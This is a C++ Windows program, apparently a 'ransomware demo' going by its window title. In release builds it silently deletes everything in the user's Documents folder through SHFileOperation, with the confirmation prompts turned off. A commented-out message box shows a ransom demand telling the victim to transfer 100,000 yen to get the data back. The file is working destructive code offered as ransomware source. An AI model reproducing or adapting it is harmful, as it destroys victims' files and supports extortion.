#include<Windows.h>
#include<ShlObj.h>
#include<string>
#include"TString.h"
#include"SimpleWindow.h"
//#include"resource.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE , LPSTR, int)
{
	// フォルダーの位置を入れるためのバッファ 
	TCHAR myDocumentsFolder[MAX_PATH];

	// フォルダーの位置の取得 
	SHGetFolderPath(NULL, CSIDL_MYDOCUMENTS, NULL, NULL, myDocumentsFolder);

	/*
	//本番用
	int len = _tcslen(myDocumentsFolder);
	TCHAR *pszFrom = new TCHAR[len + 2];
	_tcscpy(pszFrom, myDocumentsFolder);
	pszFrom[len] = 0;
	pszFrom[len + 1] = 0;
	*/

	
	TCHAR testFilePath[] = TEXT("\\*");
	_tcscat(myDocumentsFolder, testFilePath);

	int len = _tcslen(myDocumentsFolder);
	TCHAR *pszFrom = new TCHAR[len + 2];
	_tcscpy(pszFrom, myDocumentsFolder);
	pszFrom[len] = 0;
	pszFrom[len + 1] = 0;



	// メッセージ ボックスにフォルダーの位置を表示 
	//MessageBox(nullptr, pszFrom, TEXT("フォルダーの位置"), MB_OK);

	
	SHFILEOPSTRUCT deleteOp = {
		nullptr,
		FO_DELETE,
		pszFrom,
		nullptr,
		FOF_ALLOWUNDO | FOF_SILENT | FOF_NOCONFIRMATION /* FOF_SIMPLEPROGRESS */,
		false,
		nullptr,
		nullptr
	};
	
#ifndef _DEBUG
	int error = SHFileOperation(&deleteOp);
#endif

	Inferno::SimpleWindow window;
	window.Initialize();
	window.SetTitleText(_T("ランサムウェアデモ"));
	window.Show();

	/*
	MessageBox(nullptr, 
		TEXT("あなたのデータは消去されました。\n返してほしくば\n********に金10万を振込みなさい。"), 
		TEXT("データを消去しました"), 
		MB_ICONWARNING);
	*/

	delete pszFrom;

	MSG msg;
	while (true)
	{
		if (PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE))
		{
			//WM_QUITEがきたらGetMessageは0を返す
			if (!GetMessage(&msg, NULL, 0, 0)) break;
			TranslateMessage(&msg); //キーボード関連のメッセージを翻訳する
			DispatchMessage(&msg); //OSにメッセージを渡す（＝ウィンドウプロシージャに渡す）
		}
		Sleep(1);
	}
	return msg.wParam; //作法

	return 0;
}